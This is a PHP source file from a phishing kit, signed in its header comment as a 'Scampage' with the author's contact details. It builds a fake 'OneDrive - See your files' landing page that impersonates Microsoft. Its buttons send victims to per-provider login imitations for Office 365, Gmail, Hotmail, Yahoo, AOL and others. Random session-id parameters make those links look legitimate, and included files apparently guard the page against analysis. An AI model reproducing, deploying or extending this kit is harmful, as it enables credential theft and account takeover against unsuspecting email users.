<?php
/*
 * Scampage by oluxshop
 * Jabber: christopherbourne101@gmail.com
 * ICQ: admin
 */
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

?>
<!DOCTYPE html>
<html lang="en" style="height: 100%;">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">

    <title>OneDrive - See your files</title>
</head>
<body style="height: 100%;background: url(assets/files/bg.jpg) no-repeat center center fixed; -webkit-background-size: cover;-moz-background-size: cover;-o-background-size: cover;background-size: cover;">
<div style=" padding-top: 50px; color: white;float: left; width: 250px; background-color: #232323; height: 100%;" class="text-center">
    <img style="width: 200px; height: auto;" src="assets/files/logo.png" alt=""><br /><br />
    <br />
    <h4 class="text-center">Login via</h4>
    <br />

    <a href="Office365.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info">Office 365</a> <br />
    <a href="GMAIL.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info">GMAIL</a><br />
    <a href="Hotmail.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info">Hotmail</a><br />
    <a href="Yahoo.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info">Yahoo</a><br />
    <a href="Aol.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info">AOL</a><br />
    <a href="Other.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" style="padding: 7px 50px; margin-bottom: 15px; width: 170px;" class="btn btn-info">Other</a><br />

</div>

<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js" integrity="sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T" crossorigin="anonymous"></script>
</body>
</html>
